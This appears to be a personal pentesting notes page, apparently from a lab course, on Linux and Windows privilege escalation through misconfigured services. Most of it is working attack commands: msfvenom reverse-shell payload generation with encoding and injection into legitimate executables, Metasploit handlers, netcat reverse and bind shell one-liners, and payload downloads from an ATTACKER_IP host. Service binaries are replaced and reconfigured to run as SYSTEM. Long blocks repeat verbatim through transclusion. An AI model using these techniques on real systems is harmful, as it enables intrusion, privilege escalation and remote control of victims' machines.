- System enumeration - Automated
- https://github.com/The-Z-Labs/linux-exploit-suggester
**linux-exploit-suggester-2**
```shell
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh && \
perl linux-exploit-suggester-2.pl
```

</div></div>


# Windows privesc
- [[Windows account\|Windows account]]
```powershell
dir /b/s "\*.conf*"
dir /b/s "\*.txt*"
dir /b/s "\*secret*"
route print
netstat -r
fsutil fsinfo drives
wmic logicaldisk get Caption,Description,providername
```


## Abusing Service Misconfigurations
- [[Windows services\|Windows services]]
### CanRestart and writable service
- IF an service is Canrestart True and writeable.
- The Path is
  `Path: C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe`
- We can replace the legitimate application with our malicious one
- restart the service, which will run our infected program!
```shell
msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Unquoted Service Paths

</div>


- When we **can't** **write** into service **executables**.
- If a service is configured to point to an "unquoted" executable.
```shell-session
sc qc "vncserver"
```
Correct
![Pasted image 20240821200031.png|600](/img/user/attachments/Pasted%20image%2020240821200031.png)
Example Incorrect
![Pasted image 20240821200138.png|600](/img/user/attachments/Pasted%20image%2020240821200138.png)
- When the [[SCM\|SCM]] tries to execute the binary, a problem arises.
- Since there are **spaces** on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM **doesn't know which** of the following you are trying to **execute**.
- Spaces are used as argument separators unless they are part of a quoted string

| Command                                              | Argument 1                 | Argument 2                 |
| ---------------------------------------------------- | -------------------------- | -------------------------- |
| C:\MyPrograms\Disk.exe                               | Sorter                     | Enterprise\bin\disksrs.exe |
| C:\MyPrograms\Disk Sorter.exe                        | Enterprise\bin\disksrs.exe |                            |
| C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe |                            |                            |
1. First, search for `C:\\MyPrograms\\Disk.exe`. If it exists, the service will run this executable.
2. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter.exe`. If it exists, the service will run this executable.
3. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe`. This option is expected to succeed and will typically be run in a default installation.

Usually that files are installed on system folders but:
- Some installers change the permissions on the installed folders, making the services vulnerable.
- An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, the vulnerability can be exploited.

For tis example, check the folder permissions
![Pasted image 20240821211411.png|600](/img/user/attachments/Pasted%20image%2020240821211411.png)
The `BUILTIN\\Users` group has **AD** and **WD** privileges, allowing the user to create subdirectories and files, respectively.

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Generate and encode **payloads**
- Access all payloads available in the [[Metasploit\|Metasploit]] framework.
- Create payloads in many **different formats** (PHP, exe, dll, elf, , aspx, .war, .py, etc.)
- Different target systems (Apple, Windows, Android, Linux, etc.).
- Used extensively in **lower-level exploit** development to generate **hexadecimal shellcode** when developing something like a **Buffer Overflow exploit**
- A payload contains code and that code is called [[Shellcode\|Shellcode]]

| Option                                               | Description                                         |
| ---------------------------------------------------- | --------------------------------------------------- |
| `msfvenom -l payloads`                               | List payloads                                       |
| `msfvenom --list formats`                            | List formats                                        |
| `msfvenom --list payloads`                           | list supported output formats                       |
| `msfvenom -p payload`                                | Select a payload                                    |
| `msfvenom -p cmd/unix/reverse_netcat --list-options` | List options                                        |
| `R`                                                  | Set `R` at final of code is to specify reverseshell |

```shell
payload options
```
```sh
msfvenom -s linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=443
```
# Non staged - Single
- send payload in 1 file
- easier to use and catch
- easier for an antivirus or intrusion detection program to discover and remove.
- Stageless payloads are denoted with underscores (`_`)
# Stages
- send payload in some files or parts
- harder to use,
- **first part** is called the _stager_
- executed directly on the server itself.
- It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself.
- preventing it from touching the disk where it could be caught by traditional anti-virus solutions.
- connects to the listener and uses the connection **to load the real payload**
- Thus the payload is **split** into **two parts**
	- a small **initial stager**
	- then the bulkier **reverse shell code** which is downloaded when the stager is activated
- Staged payloads require a special listener, usually the [[Metasploit\|Metasploit]] Multihandler
- Modern day antivirus solutions will also make use of the [[AMSI\|AMSI]] to detect the payload
- are denoted with another forward slash (`/`).
# Payloads
Payload Naming Conventions
```sh
<OS>/<arch>/<payload>
```

Stageless reverse shell for an x86 Linux target
```sh
linux/x86/shell_reverse_tcp
```

Windows 32bit targets (exception, the arch is not specified)
```sh
windows/shell_reverse_tcp
```
## Reverse payloads
- you will need to **have the** exploit/multi/**handler module listening** on your attacking machine to work as a handler
- You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters.
- These values will be the same you have used when creating the msfvenom payload.

| Option                                                                                          | Description |
| ----------------------------------------------------------------------------------------------- | ----------- |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp` | ASP         |
| `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`          | Python      |
| `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`     | PHP         |
| `msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R`                                | Unix        |
Linux - Executable and Linkable Format (elf)
- staged
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
```
- The .elf format is comparable to the .exe format in Windows
```bash
chmod +x shell.elf
./shell.elf
```

### Windows
Windows reverse tcp (staged)
``` shell
mfsvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=IP LPORT=47 -f exe -o rev_shell.exe
```
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
```
Windows reverse tcp (non staged)
``` shell
mfsvenom -p windows/x64/meterpreter_reverse_tcp --platform windows -a x64 LHOST=IP LPORT=47 -f exe -o reverse.exe
```

**Exe-service**
- Exe-service payload and serve it through a python webserver:
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4747 -f exe-service -o rev-svc.exe

python3 -m http.server
```
- Pull the payload from Powershell
```powershell
wget http://ATTACKER_IP:4848/rev-svc.exe -O rev-svc.exe
```
### PHP
```shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
```
- The output **PHP file** will miss the starting PHP tag commented and the end tag (`?>`), as seen below.
![Pasted image 20240606180600.png|600](/img/user/attachments/Pasted%20image%2020240606180600.png)
- The reverse_shell.php file should be edited to convert it into a working PHP file.
- Below: Comments removed from the beginning of the file.
- End tag added
![Pasted image 20240606180735.png|500](/img/user/attachments/Pasted%20image%2020240606180735.png)
![Pasted image 20240606180753.png|400](/img/user/attachments/Pasted%20image%2020240606180753.png)
## [[meterpreter\|meterpreter]]
# Encoders
- Encoders **do not aim to bypass antivirus** installed on the target system
- **Encode** the payload.
- Can be effective against **some old antivirus** software
- [[Shellcode\|Shellcode]]
- Use with `-e`

| Option                     | Description                                                 |
| -------------------------- | ----------------------------------------------------------- |
| `msfvenom --list encoders` | List encoders                                               |
| `-f <format>`              | Specifies the output format.                                |
| `-o <file>`                | The output location and filename for the generated payload. |
| `LHOST=<IP>`               | Specifies the IP to connect back to.                        |
| `LPORT=<port>`             | The port on the local machine to connect back to.           |
| `--platform`               | specificity paltorm                                         |
| `-a`                       | specificity arch                                            |
| `-i 10`                    | Interate, times to encode                                   |
| `-e`                       | Especify the encoder method                                 |
The PHP version of Meterpreter was **encoded in Base64**, and the output format was `raw`.
Staged
``` shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 LPORT=47 -f raw -e php/base64
```

 To get access with [[Notes/Netcat\|Netcat]] 
``` shell
msfvenom -p php/shell/reverse_tcp LHOST=10.10.186.44 LPORT=47 -f raw -e php/base64
```

Exe shikataganai, recommendations `-i 10`
``` shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 LPORT=47 -f exe -e x86/shikata_ga_nai > encoded.exe
```
# Template 
- Inject payloads into files
- Set payload into an existent file
- Doesn't work on all programs
Windows
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=4747 -e x86/shikata_ga_nai -i 10 -x original_app.exe --keep -f exe -o new_app.exe
```

| Option           | Description                                |
| ---------------- | ------------------------------------------ |
| `-x`             | Inject to the file                         |
| `-k`<br>`--keep` | Try to keep the original app functionality |
# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Like socat and netcat
- used to **receive reverse shells.**
- fully-fledged way to obtain stable shells
- with a wide variety of further options to improve the caught shell.
- only way to interact with a _meterpreter_ shell
- the easiest way to handle _staged_ payloads
- Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.
``` shell
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST IP
set LPORT port
exploit
```
The payload could change depending on the case.
Usually use same payload used from [[Msfvenom\|Msfvenom]] create
E.g.
`php/meterpreter/reverse_tcp`
Example to DVWA (Damn Vulnerable Web Application)
`set payload php/reverse_php`

Start a listener in the background
```sh
exploit -j
```
Then we needed to use `sessions 1` to foreground it again.


</div></div>


</div></div>

Move to the folder.
```powershell
move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
```
Grant full permissions to the Everyone group as well:
```powershell
icacls Disk.exe /grant Everyone:F
```
Start a revershell listener on attacker machine.
And restart the service. (In a normal case you would likely have to wait for a service restart)
```powershell
sc stop "disk sorter enterprise"
sc start "disk sorter enterprise"
```
> [!note]
 PowerShell has `sc` as an alias to `Set-Content`, therefore you need to use `sc.exe` in order to control services with PowerShell this way.



</div></div>


### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Insecure Permissions on Service Executable

</div>


- If the **executable** associated with a service **has weak permissions** that allow an attacker to modify or replace it, the attacker can **gain** the **privileges** of the service's account trivially.

Example
```cmd
sc qc WindowsScheduler
```
```powershell
sc.exe qc WindowsScheduler
```
![Pasted image 20240821083409.png|600](/img/user/attachments/Pasted%20image%2020240821083409.png)
Check permissions with `icalcs`
```shell-session
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```
![Pasted image 20240821083627.png|600](/img/user/attachments/Pasted%20image%2020240821083627.png)
The everyone group has modify permissions `(M)` on the service's executable.
We can overwrite it with any payload.
Generate an exe-service payload using [[Msfvenom\|Msfvenom]]

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Generate and encode **payloads**
- Access all payloads available in the [[Metasploit\|Metasploit]] framework.
- Create payloads in many **different formats** (PHP, exe, dll, elf, , aspx, .war, .py, etc.)
- Different target systems (Apple, Windows, Android, Linux, etc.).
- Used extensively in **lower-level exploit** development to generate **hexadecimal shellcode** when developing something like a **Buffer Overflow exploit**
- A payload contains code and that code is called [[Shellcode\|Shellcode]]

| Option                                               | Description                                         |
| ---------------------------------------------------- | --------------------------------------------------- |
| `msfvenom -l payloads`                               | List payloads                                       |
| `msfvenom --list formats`                            | List formats                                        |
| `msfvenom --list payloads`                           | list supported output formats                       |
| `msfvenom -p payload`                                | Select a payload                                    |
| `msfvenom -p cmd/unix/reverse_netcat --list-options` | List options                                        |
| `R`                                                  | Set `R` at final of code is to specify reverseshell |

```shell
payload options
```
```sh
msfvenom -s linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=443
```
# Non staged - Single
- send payload in 1 file
- easier to use and catch
- easier for an antivirus or intrusion detection program to discover and remove.
- Stageless payloads are denoted with underscores (`_`)
# Stages
- send payload in some files or parts
- harder to use,
- **first part** is called the _stager_
- executed directly on the server itself.
- It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself.
- preventing it from touching the disk where it could be caught by traditional anti-virus solutions.
- connects to the listener and uses the connection **to load the real payload**
- Thus the payload is **split** into **two parts**
	- a small **initial stager**
	- then the bulkier **reverse shell code** which is downloaded when the stager is activated
- Staged payloads require a special listener, usually the [[Metasploit\|Metasploit]] Multihandler
- Modern day antivirus solutions will also make use of the [[AMSI\|AMSI]] to detect the payload
- are denoted with another forward slash (`/`).
# Payloads
Payload Naming Conventions
```sh
<OS>/<arch>/<payload>
```

Stageless reverse shell for an x86 Linux target
```sh
linux/x86/shell_reverse_tcp
```

Windows 32bit targets (exception, the arch is not specified)
```sh
windows/shell_reverse_tcp
```
## Reverse payloads
- you will need to **have the** exploit/multi/**handler module listening** on your attacking machine to work as a handler
- You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters.
- These values will be the same you have used when creating the msfvenom payload.

| Option                                                                                          | Description |
| ----------------------------------------------------------------------------------------------- | ----------- |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp` | ASP         |
| `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`          | Python      |
| `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`     | PHP         |
| `msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R`                                | Unix        |
Linux - Executable and Linkable Format (elf)
- staged
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
```
- The .elf format is comparable to the .exe format in Windows
```bash
chmod +x shell.elf
./shell.elf
```

### Windows
Windows reverse tcp (staged)
``` shell
mfsvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=IP LPORT=47 -f exe -o rev_shell.exe
```
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
```
Windows reverse tcp (non staged)
``` shell
mfsvenom -p windows/x64/meterpreter_reverse_tcp --platform windows -a x64 LHOST=IP LPORT=47 -f exe -o reverse.exe
```

**Exe-service**
- Exe-service payload and serve it through a python webserver:
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4747 -f exe-service -o rev-svc.exe

python3 -m http.server
```
- Pull the payload from Powershell
```powershell
wget http://ATTACKER_IP:4848/rev-svc.exe -O rev-svc.exe
```
### PHP
```shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
```
- The output **PHP file** will miss the starting PHP tag commented and the end tag (`?>`), as seen below.
![Pasted image 20240606180600.png|600](/img/user/attachments/Pasted%20image%2020240606180600.png)
- The reverse_shell.php file should be edited to convert it into a working PHP file.
- Below: Comments removed from the beginning of the file.
- End tag added
![Pasted image 20240606180735.png|500](/img/user/attachments/Pasted%20image%2020240606180735.png)
![Pasted image 20240606180753.png|400](/img/user/attachments/Pasted%20image%2020240606180753.png)
## [[meterpreter\|meterpreter]]
# Encoders
- Encoders **do not aim to bypass antivirus** installed on the target system
- **Encode** the payload.
- Can be effective against **some old antivirus** software
- [[Shellcode\|Shellcode]]
- Use with `-e`

| Option                     | Description                                                 |
| -------------------------- | ----------------------------------------------------------- |
| `msfvenom --list encoders` | List encoders                                               |
| `-f <format>`              | Specifies the output format.                                |
| `-o <file>`                | The output location and filename for the generated payload. |
| `LHOST=<IP>`               | Specifies the IP to connect back to.                        |
| `LPORT=<port>`             | The port on the local machine to connect back to.           |
| `--platform`               | specificity paltorm                                         |
| `-a`                       | specificity arch                                            |
| `-i 10`                    | Interate, times to encode                                   |
| `-e`                       | Especify the encoder method                                 |
The PHP version of Meterpreter was **encoded in Base64**, and the output format was `raw`.
Staged
``` shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 LPORT=47 -f raw -e php/base64
```

 To get access with [[Notes/Netcat\|Netcat]] 
``` shell
msfvenom -p php/shell/reverse_tcp LHOST=10.10.186.44 LPORT=47 -f raw -e php/base64
```

Exe shikataganai, recommendations `-i 10`
``` shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 LPORT=47 -f exe -e x86/shikata_ga_nai > encoded.exe
```
# Template 
- Inject payloads into files
- Set payload into an existent file
- Doesn't work on all programs
Windows
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=4747 -e x86/shikata_ga_nai -i 10 -x original_app.exe --keep -f exe -o new_app.exe
```

| Option           | Description                                |
| ---------------- | ------------------------------------------ |
| `-x`             | Inject to the file                         |
| `-k`<br>`--keep` | Try to keep the original app functionality |
# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Like socat and netcat
- used to **receive reverse shells.**
- fully-fledged way to obtain stable shells
- with a wide variety of further options to improve the caught shell.
- only way to interact with a _meterpreter_ shell
- the easiest way to handle _staged_ payloads
- Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.
``` shell
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST IP
set LPORT port
exploit
```
The payload could change depending on the case.
Usually use same payload used from [[Msfvenom\|Msfvenom]] create
E.g.
`php/meterpreter/reverse_tcp`
Example to DVWA (Damn Vulnerable Web Application)
`set payload php/reverse_php`

Start a listener in the background
```sh
exploit -j
```
Then we needed to use `sessions 1` to foreground it again.


</div></div>


</div></div>

Replace the service executable with our payload
```powershell
cd C:\PROGRA~2\SYSTEM~1\

move WService.exe WService.exe.bkp

move C:\Users\thm-unpriv\rev-svc.exe WService.exe
```
Grant full permissions to the Everyone group as well:
```powershell
icacls WService.exe /grant Everyone:F
```
Start a revershell listener on attacker machine.
And restart the service. (In a normal case you would likely have to wait for a service restart)
```powershell
sc stop windowsscheduler
sc start windowsscheduler
```
> [!note]
 PowerShell has `sc` as an alias to `Set-Content`, therefore you need to use `sc.exe` in order to control services with PowerShell this way.



</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Insecure Service Permissions

</div>


- If the **service** [[DACL\|DACL]] **allow** you ti **modify** the **configuration** of a service, we will be able to **reconfigure** the service.
- Pointing to any **executable** to **run** it using any account, including `SYSTEM` itself.

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Check for a **service** [[DACL\|DACL]]
- https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk
Run it on `cmd`
```cmd
accesschk64.exe -qlc thmservice
```

Example:
![Pasted image 20240822181926.png|400](/img/user/attachments/Pasted%20image%2020240822181926.png)
- The `BUILTIN\\Users` group has the SERVICE_ALL_ACCESS permission
- Means **any user** can reconfigure the service.

</div></div>

Create the payload

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Generate and encode **payloads**
- Access all payloads available in the [[Metasploit\|Metasploit]] framework.
- Create payloads in many **different formats** (PHP, exe, dll, elf, , aspx, .war, .py, etc.)
- Different target systems (Apple, Windows, Android, Linux, etc.).
- Used extensively in **lower-level exploit** development to generate **hexadecimal shellcode** when developing something like a **Buffer Overflow exploit**
- A payload contains code and that code is called [[Shellcode\|Shellcode]]

| Option                                               | Description                                         |
| ---------------------------------------------------- | --------------------------------------------------- |
| `msfvenom -l payloads`                               | List payloads                                       |
| `msfvenom --list formats`                            | List formats                                        |
| `msfvenom --list payloads`                           | list supported output formats                       |
| `msfvenom -p payload`                                | Select a payload                                    |
| `msfvenom -p cmd/unix/reverse_netcat --list-options` | List options                                        |
| `R`                                                  | Set `R` at final of code is to specify reverseshell |

```shell
payload options
```
```sh
msfvenom -s linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=443
```
# Non staged - Single
- send payload in 1 file
- easier to use and catch
- easier for an antivirus or intrusion detection program to discover and remove.
- Stageless payloads are denoted with underscores (`_`)
# Stages
- send payload in some files or parts
- harder to use,
- **first part** is called the _stager_
- executed directly on the server itself.
- It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself.
- preventing it from touching the disk where it could be caught by traditional anti-virus solutions.
- connects to the listener and uses the connection **to load the real payload**
- Thus the payload is **split** into **two parts**
	- a small **initial stager**
	- then the bulkier **reverse shell code** which is downloaded when the stager is activated
- Staged payloads require a special listener, usually the [[Metasploit\|Metasploit]] Multihandler
- Modern day antivirus solutions will also make use of the [[AMSI\|AMSI]] to detect the payload
- are denoted with another forward slash (`/`).
# Payloads
Payload Naming Conventions
```sh
<OS>/<arch>/<payload>
```

Stageless reverse shell for an x86 Linux target
```sh
linux/x86/shell_reverse_tcp
```

Windows 32bit targets (exception, the arch is not specified)
```sh
windows/shell_reverse_tcp
```
## Reverse payloads
- you will need to **have the** exploit/multi/**handler module listening** on your attacking machine to work as a handler
- You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters.
- These values will be the same you have used when creating the msfvenom payload.

| Option                                                                                          | Description |
| ----------------------------------------------------------------------------------------------- | ----------- |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp` | ASP         |
| `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`          | Python      |
| `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`     | PHP         |
| `msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R`                                | Unix        |
Linux - Executable and Linkable Format (elf)
- staged
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
```
- The .elf format is comparable to the .exe format in Windows
```bash
chmod +x shell.elf
./shell.elf
```

### Windows
Windows reverse tcp (staged)
``` shell
mfsvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=IP LPORT=47 -f exe -o rev_shell.exe
```
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
```
Windows reverse tcp (non staged)
``` shell
mfsvenom -p windows/x64/meterpreter_reverse_tcp --platform windows -a x64 LHOST=IP LPORT=47 -f exe -o reverse.exe
```

**Exe-service**
- Exe-service payload and serve it through a python webserver:
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4747 -f exe-service -o rev-svc.exe

python3 -m http.server
```
- Pull the payload from Powershell
```powershell
wget http://ATTACKER_IP:4848/rev-svc.exe -O rev-svc.exe
```
### PHP
```shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
```
- The output **PHP file** will miss the starting PHP tag commented and the end tag (`?>`), as seen below.
![Pasted image 20240606180600.png|600](/img/user/attachments/Pasted%20image%2020240606180600.png)
- The reverse_shell.php file should be edited to convert it into a working PHP file.
- Below: Comments removed from the beginning of the file.
- End tag added
![Pasted image 20240606180735.png|500](/img/user/attachments/Pasted%20image%2020240606180735.png)
![Pasted image 20240606180753.png|400](/img/user/attachments/Pasted%20image%2020240606180753.png)
## [[meterpreter\|meterpreter]]
# Encoders
- Encoders **do not aim to bypass antivirus** installed on the target system
- **Encode** the payload.
- Can be effective against **some old antivirus** software
- [[Shellcode\|Shellcode]]
- Use with `-e`

| Option                     | Description                                                 |
| -------------------------- | ----------------------------------------------------------- |
| `msfvenom --list encoders` | List encoders                                               |
| `-f <format>`              | Specifies the output format.                                |
| `-o <file>`                | The output location and filename for the generated payload. |
| `LHOST=<IP>`               | Specifies the IP to connect back to.                        |
| `LPORT=<port>`             | The port on the local machine to connect back to.           |
| `--platform`               | specificity paltorm                                         |
| `-a`                       | specificity arch                                            |
| `-i 10`                    | Interate, times to encode                                   |
| `-e`                       | Especify the encoder method                                 |
The PHP version of Meterpreter was **encoded in Base64**, and the output format was `raw`.
Staged
``` shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 LPORT=47 -f raw -e php/base64
```

 To get access with [[Notes/Netcat\|Netcat]] 
``` shell
msfvenom -p php/shell/reverse_tcp LHOST=10.10.186.44 LPORT=47 -f raw -e php/base64
```

Exe shikataganai, recommendations `-i 10`
``` shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 LPORT=47 -f exe -e x86/shikata_ga_nai > encoded.exe
```
# Template 
- Inject payloads into files
- Set payload into an existent file
- Doesn't work on all programs
Windows
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=4747 -e x86/shikata_ga_nai -i 10 -x original_app.exe --keep -f exe -o new_app.exe
```

| Option           | Description                                |
| ---------------- | ------------------------------------------ |
| `-x`             | Inject to the file                         |
| `-k`<br>`--keep` | Try to keep the original app functionality |
# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Like socat and netcat
- used to **receive reverse shells.**
- fully-fledged way to obtain stable shells
- with a wide variety of further options to improve the caught shell.
- only way to interact with a _meterpreter_ shell
- the easiest way to handle _staged_ payloads
- Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.
``` shell
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST IP
set LPORT port
exploit
```
The payload could change depending on the case.
Usually use same payload used from [[Msfvenom\|Msfvenom]] create
E.g.
`php/meterpreter/reverse_tcp`
Example to DVWA (Damn Vulnerable Web Application)
`set payload php/reverse_php`

Start a listener in the background
```sh
exploit -j
```
Then we needed to use `sessions 1` to foreground it again.


</div></div>


</div></div>

Put it on the corresponding folder
Grant permissions to `Everyone` to execute the payload:
```powershell
icacls C:\Users\thm-unpriv\rev-svc.exe /grant Everyone:F
```
Change the service's associated executable and account (**mind the spaces after the equal signs when using sc.exe**)
```powershell
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc.exe" obj= LocalSystem
```

<div class="transclusion internal-embed is-loaded"><a class="markdown-embed-link" href="/notes/netcat/#listener-revershell" aria-label="Open link"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-link"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a><div class="markdown-embed">




- "Swiss Army Knife" of networking.
- Perform all kinds of network interactions.
- Support [[TCP\|TCP]] and [[UDP\|UDP]]
- Used to receive reverse shells and connect to remote ports attached to bind shells on a target system.
- If you choose to use a **port below 1024**, you will need to use `sudo` when starting your listener.
- It's **good idea** to **use** a **well-known** port number (**80, 443 or 53** being good choices) as this is more likely to get **past** outbound **firewall rules** on the target.

| Command   | Description                                                                        |
| --------- | ---------------------------------------------------------------------------------- |
| `-l`      | is used to tell netcat that this will be a listener                                |
| `-n`      | tells netcat not to resolve host names or use DNS. avoid DNS lookups and warnings. |
| `-v`      | is used to request a verbose output                                                |
| `-p`      | indicates that the port specification will follow.                                 |
| `-vv`     | Very Verbose (optional)                                                            |
| `-k`      | Keep listening after client disconnects                                            |
| `-w SECS` | Timeout for connects and final net reads                                           |
| `-u`      | Over [[UDP\|UDP]]                                                                       |
# Normal Connection
Listener Machine 1
```shell
nc -lnvp PORT
```

Secondary Machine 2
```shell
nc -nv IP_MACHINE_1 PORT
```
# Transfer files
1. On the destination machine
```shell
nc -lnvp 1234 > file.txt
```
2. On the source machine
```shell
nc -nv IP_destination 1234 < file.txt
```

# Banner grabbing
Connect to a service to get the *Banner Grabber*
```shell
nc -nv IP PORT
```
# Reverse shell

## On the attacker (Listener)
65535 total number of ports
Start a listener using rlwrap to try to simulate an interactive console
``` sh
rlwrap nc -lnvp 4747
```
ncat has more options like encrypt with ssl
``` bash
ncat --ssl 127.0.0.1 30001
```
To open tcp/udp in a host, assosiate a shell to a port, force UDP/TCP conexions
```bash
nc localhost 4747
```
## On the target
### Linux
Send a bash
```sh
nc <LOCAL-IP> <PORT> -c /bin/sh
nc <LOCAL-IP> <PORT> -c /bin/bash
nc -e /dev/tcp/ipattacker/443 0>&1
```
Create a [[named pipe\|named pipe]]
this is **not included in most versions of netcat** as it is widely seen to be very insecure
```sh
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LOCAL-IP> <PORT> >/tmp/f
```
### Windows
**On Windows** this technique will **work perfectly**, where a static binary is nearly always required
Send a cmd
```sh
nc 10.10.38.232 443 -e “cmd.exe”
```
Send a powershell
```sh
nc 10.10.38.232 443 -e “powershell.exe”
```
# Bind shell
## On the target (Listener)
### Linux
```bash
nc -lnvp <port> -c /bin/sh
nc -lnvp <port> -c /bin/bash
```

On Linux, however, we would instead use this code to create a listener for a bind shell:
[[named pipe\|named pipe]]
```sh
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
### Windows
Or get a cmd on windows
```sh
nc -lvnp <port> -e "cmd.exe"
```
## On the attacker
```bash
nc -nv <target-ip> <chosen-port>
```


</div></div>

Restart the service.
```powershell
sc stop THMService
sc start THMService
```

</div></div>


### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Service Object Permissions

</div>


 - Los permisos de servicio mal configurados pueden permitir a un atacante modificar o reconfigurar los atributos asociados a ese servicio
- Al explotar tales servicios, los atacantes pueden incluso añadir nuevos usuarios al grupo de administradores locales y luego secuestrar la nueva cuenta para elevar sus privilegios
